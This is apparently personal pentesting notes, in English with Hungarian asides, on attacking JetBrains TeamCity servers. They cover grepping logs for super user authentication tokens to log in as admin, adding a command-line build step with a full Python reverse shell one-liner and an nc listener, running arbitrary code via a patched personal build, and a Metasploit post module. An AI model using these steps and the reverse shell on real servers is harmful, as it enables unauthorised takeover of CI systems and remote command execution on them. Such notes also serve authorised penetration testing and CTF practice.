# TeamCity
## info
* TeamCity is a build management and continuous integration server from JetBrains.
* common port: 8111
### Interesting directories and files
* /admin
* /admin/admin.html
* TeamCity/conf/teamcity-startup.propertie
* .BuildServer/system
### Find Super User Authentication Tokens
* If we find a super user authentication token, we can login as super user using the token.
* After retrieving, we can login as administrator by entering the token in the password field and empty the username.
* Open browser with port 8111, and login, (if it is internal service - portforward it to the attack machine)
* Ha tobb token is van, akkor valszeg az uccso lesz a jo
<pre>
grep -rni 'authentication token' TeamCity/logs
grep -rni 'Super user authentication token' TeamCity/logs
grep -rni 'token' TeamCity/logs
</pre>
### Arbitrary Command Execution by Custom Script
1. Login as admin user.
2. Create a new project in admin dashboard.
3. Click "Manual" tab and fill required fields. (csak siman toltsuk ki valamivel es 'Create')
4. A new project is created.
5. In the project home, create a Build Configurations. (csak siman toltsuk ki valamivel es 'Create') (utana valami VCS szart akar kitoltetni de azt hagyjuk a francba es lepjunk vissza a project attekintohoz)
6. In the build configuration page, click "Build Steps" on the left menus. (ra kell menni a build conf-ra a project-nel 'edit' es utana a 'building steps' linkre)
7. Add build step.
8. Select "Command Line" in Runner type.
9. Put a Python reverse shell script in the "Custom script".
<pre>
export RHOST="<local-ip>";export RPORT=<local-port>;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
</pre>
10. Start listener in local machine.
<pre>
nc -lvnp 4444
</pre>
11. Click "Run" button in the build page. (eloszor el kell menteni es aztan utana ott lesz a 'run' gomb jobbra fent es arra kell ramenni)
12. We should get a shell in terminal.
### Arbitrary Command Execution by Diff Build
* If we can modify a building script, we can execute arbitrary script by uploading a git patch file.
* First, modify the script to our desired code.
<pre>
cd /path/to/repository
vim example.ps
git diff > patch
</pre>
* Then go to the build configuration page, and open the "Run Custom Build" at the right of the Run button.
* In General section, check "run as personal build" and upload the patch file which was generated above.
* Now click "Run Build". Our arbitrary code will be executed when building.
### Metasploit module (nem teszteltuk eddig) (felepult session kell hozza)
* https://github.com/kacperszurek/pentest_teamcity
* ha van mar session-unk es valahogy elerjuk az oldalt normalisan (?kivulrol vagy belulrol - ki tudja...) akkor lehet csapatni
* msf6> use post/jetbrains
## sources
* https://exploit-notes.hdks.org/exploit/web/teamcity-pentesting/
